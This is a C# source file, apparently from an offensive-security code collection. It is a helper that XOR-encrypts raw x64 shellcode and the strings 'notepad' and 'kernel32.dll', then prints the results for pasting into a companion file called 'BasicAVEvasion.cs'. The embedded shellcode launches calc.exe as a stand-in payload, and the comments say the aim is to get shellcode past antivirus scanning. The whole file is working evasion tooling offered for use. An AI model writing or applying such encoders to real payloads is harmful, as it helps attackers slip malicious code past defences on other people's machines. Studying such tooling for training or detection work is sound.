using System;
using System.Diagnostics;
using System.Text;

// Helper program to define encrypted shellcode and strings
// Alternatively, you can use helper tools like the below to encrypt your data
// https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/Linux%20Shellcode%20Encoder/shellcodeCrypter-bin.py

namespace Encryptor
{
    public class BasicAVEvasion
    {

        // Define our key, in this case we use a single-byte key for XOR operations
        // This key HAS TO match the key provided in 'BasicAVEvasion.cs' or decryption will fail
        private static uint key = 0x37;

        // Helper function to XOR-encode our shellcode byte array
        private static byte[] xorEncrypt(byte[] plaintext)
        {
            byte[] encrypted = new byte[plaintext.Length];
            for (int i = 0; i < plaintext.Length; i++)
            {
                encrypted[i] = (byte)((uint)plaintext[i] ^ key);
            }
            return encrypted;
        }

        // Overload the above function to also accept a string as input
        private static byte[] xorEncrypt(string plaintext) 
        {
            byte[] encrypted = new byte[plaintext.Length];
            for (int i = 0; i < plaintext.Length; i++)
            {
                encrypted[i] = (byte)((uint)plaintext[i] ^ key);
            }
            // We still return a byte-array here because the encrypted string may contain unprintable bytes
            return encrypted;
        }

        // Helper function to print a byte array in the right format
        private static void printByteArray(string varname, byte[] data){
            StringBuilder hexString = new StringBuilder(data.Length * 2);

            for (int count = 0; count < data.Length; count++)
            {
                byte b = data[count];
                if ((count + 1) == data.Length) // Don't append a comma for last byte
                {
                    hexString.AppendFormat("0x{0:x2}", b);
                }
                else
                {
                    hexString.AppendFormat("0x{0:x2}, ", b);
                }

                if ((count + 1) % 15 == 0) // Split the bytes evenly
                {
                    hexString.Append("\n");
                }
            }

            // Print the formatted result
            Console.WriteLine($"byte[] {varname} = new byte[{data.Length}] {{\n{hexString}\n}};");

        }

        public static void Main()
        {

            // Define our *UNENCRYPTED* shellcode
            byte[] sc = new byte[296] {
            0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
            0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
            0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
            0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
            0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
            0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
            0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,
            0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,
            0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,
            0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
            0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,
            0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
            0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,
            0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
            0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,
            0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
            0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,
            0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x43,0x3a,0x5c,
            0x77,0x69,0x6e,0x64,0x6f,0x77,0x73,0x5c,0x73,0x79,0x73,0x74,0x65,0x6d,0x33,
            0x32,0x5c,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x00
            };
            
            // Encode the shellcode with our key and print it for copy-pasting into 'BasicAVEvasion.cs'
            printByteArray("scEnc", xorEncrypt(sc));

            // Define any strings that we want to encrypt
            string notepad = "notepad";

            // Encode the string with our key and print it for copy-pasting into 'BasicAVEvasion.cs'
            printByteArray("notepadEnc", xorEncrypt(notepad));

            // Rinse and repeat
            string kernel32 = "kernel32.dll";
            printByteArray("kernel32Enc", xorEncrypt(kernel32));
        }
    }
}